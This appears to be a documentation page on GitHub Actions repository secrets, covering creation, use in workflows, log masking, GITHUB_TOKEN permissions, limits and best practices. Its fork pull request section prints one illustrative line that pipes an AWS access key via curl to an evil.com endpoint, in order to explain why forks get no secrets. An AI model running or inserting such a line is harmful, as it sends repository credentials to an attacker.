# Repository Secrets

Secrets are encrypted variables that store sensitive values — API keys, tokens, passwords, certificates. They're encrypted at rest, masked in logs, and only exposed to authorized workflows.

---

## Creating repository secrets

**Repo → Settings → Secrets and variables → Actions → New repository secret**

Each secret has:
- **Name**: uppercase with underscores, e.g., `NPM_TOKEN`, `AWS_ACCESS_KEY_ID`
- **Value**: the sensitive string (encrypted immediately, never shown again)

Once created, a secret can only be **updated or deleted** — you can't view its value through the UI.

## Using secrets

```yaml
steps:
  - run: npm publish
    env:
      NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

Secrets are accessed via the `secrets` context:

```yaml
${{ secrets.DOCKERHUB_TOKEN }}
${{ secrets.DATABASE_URL }}
${{ secrets.SSH_PRIVATE_KEY }}
```

## Secrets in `with` parameters

```yaml
- uses: docker/login-action@v3
  with:
    username: ${{ secrets.DOCKERHUB_USERNAME }}
    password: ${{ secrets.DOCKERHUB_TOKEN }}
```

## Secrets on the command line

```yaml
- run: |
    curl -X POST https://api.example.com/deploy \
      -H "Authorization: Bearer ${{ secrets.API_TOKEN }}"
```

**Avoid** passing secrets as command-line arguments to executables — they may appear in process listings. Use environment variables instead.

---

## Automatic masking

GitHub automatically scans log output for secret values and replaces them with `***`:

```
Run echo $MY_TOKEN
echo ***        ← masked
```

Masking is per-line. If a secret spans multiple lines or gets base64-encoded, masking may not catch it. **Never intentionally log a secret.**

If a workflow prints a secret in a way that evades masking, GitHub's security team may revoke the compromised credential.

---

## GITHUB_TOKEN — the automatic secret

Every workflow run gets a `GITHUB_TOKEN` automatically. It's scoped to the current repo and expires when the job completes.

```yaml
# Access it like any other secret
${{ secrets.GITHUB_TOKEN }}

# Common use: pass it as an env var
- run: gh pr list
  env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

The token's permissions are controlled by the workflow's `permissions:` block. By default, it has read/write access to most of the repo. Restrict it:

```yaml
permissions:
  contents: read       # GITHUB_TOKEN can only read code
```

---

## Limitations

### Fork PRs

Secrets are **not available** to workflows triggered by `pull_request` from a public fork. This prevents a malicious PR that does:

```yaml
- run: echo ${{ secrets.AWS_ACCESS_KEY_ID }} | curl -X POST https://evil.com/steal -d @-
```

If you need secrets in fork PRs, use `pull_request_target` (runs from the base context) but **never check out untrusted code** in that workflow.

### Naming rules

- Must start with a letter or underscore
- Can contain letters, digits, and underscores only
- Case-insensitive (but use `UPPER_SNAKE_CASE` by convention)

### Size limit

- Max **48 KB** per secret
- Max **100 secrets** per repository (including org secrets visible to the repo)

### Updating secrets

Secrets are immutable — you can't modify a value. Delete and recreate to change one. Workflows pick up the new value on their next run.

---

## Using secrets in `if` conditions (doesn't work)

```yaml
# WRONG — secrets can't be used in if: conditions
if: ${{ secrets.DEPLOY_KEY != '' }}

# Correct — use an env var first, then check
steps:
  - run: echo "key_exists=true" >> $GITHUB_ENV
    if: ${{ env.SECRET_SET == 'true' }}
    env:
      SECRET_SET: ${{ secrets.DEPLOY_KEY != '' }}
```

Secrets are not available in `if:` conditions. The expression evaluates to an empty string.

---

## Secret best practices

1. **Use the minimum scope**: If only one workflow needs a secret, create it at the environment level instead of repo level.

2. **Use tokens, not passwords**: Docker Hub, npm, and most services now support personal access tokens (PATs) with limited scope. Use those instead of your account password.

3. **Rotate secrets regularly**: Use a calendar reminder or automated rotation. GitHub can't rotate secrets for you.

4. **Audit access**: Check which workflows use which secrets. If a workflow no longer needs a secret, remove it.

5. **Don't store secrets in variables**: Variables (`vars`) are not masked in logs. Use `vars` for non-sensitive config, `secrets` for anything sensitive.

6. **Environments for production**: Put production secrets in an environment with protection rules, not at the repo level where any workflow can use them.

7. **Never hardcode fallbacks**:

```yaml
# WRONG
env:
  TOKEN: ${{ secrets.API_TOKEN || 'hardcoded-fallback' }}

# Correct — just fail if the secret is missing
env:
  TOKEN: ${{ secrets.API_TOKEN }}
```

8. **Review log output**: After your first run, scroll through the logs to make sure no secret values appear unmasked.

---

## Programmatic secret management

### Create/update secrets via API

```bash
# Get public key
gh api repos/owner/repo/actions/secrets/public-key

# Create or update a secret (encrypt with the public key first)
gh api repos/owner/repo/actions/secrets/SECRET_NAME \
  -f encrypted_value="<base64-encrypted>" \
  -f key_id="<key-id>"
```

### List secrets (names only, not values)

```bash
gh api repos/owner/repo/actions/secrets
```

[← Back to index](../index.md)
